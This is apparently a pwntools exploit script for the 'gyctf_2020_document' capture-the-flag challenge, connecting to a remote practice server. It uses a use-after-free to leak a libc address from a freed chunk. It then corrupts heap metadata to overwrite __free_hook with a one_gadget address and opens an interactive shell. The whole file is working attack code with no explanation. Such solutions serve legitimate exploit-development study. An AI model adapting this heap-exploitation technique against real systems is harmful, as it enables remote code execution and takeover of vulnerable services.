#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

#p = process('./gyctf_2020_document')
p = remote('node3.buuoj.cn',29142)
elf = ELF('./gyctf_2020_document')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.log_level = 'debug'


def menu(c):
	p.recvuntil("choice :")
	p.sendline(str(c))

def add(name,sex,content):
	menu(1)
	p.recvuntil("name")
	p.send(name.ljust(8,"\x00"))
	p.recvuntil("sex")
	p.send(sex)
	p.recvuntil("tion")
	p.send(content.ljust(0x70,"\x00"))

def show(idx):
	menu(2)
	p.recvuntil(":")
	p.sendline(str(idx))


def delete(idx):
	menu(4)
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx,sex,content=""):
	menu(3)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil("sex?")
	p.sendline(sex)
	p.recvuntil("tion")
	p.send(content.ljust(0x70,b"\x00"))

###leak libc###
add('AAAAAAAA','W','BBBBBBBB')#0
add('/bin/sh\x00','W','CCCCCCCC')#1
add('CCCCCCCC','W','DDDDDDDD')#2

delete(0)
show(0)

libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 88 - 0x3c4b20 

###fastbin attack###
system = libc_base + 0x4526a
free_hook = libc_base + libc.symbols['__free_hook']

add('DDDDDDDD','W','EEEEEEEE')#3
add('EEEEEEEE','W','FFFFFFFF')#4

payload = p64(0) + p64(0x21) + p64(free_hook - 0x10) + p64(1) + p64(0) + p64(0x51)
edit(0,'W',payload)

edit(4,'W',p64(system))

###get shell###
ia()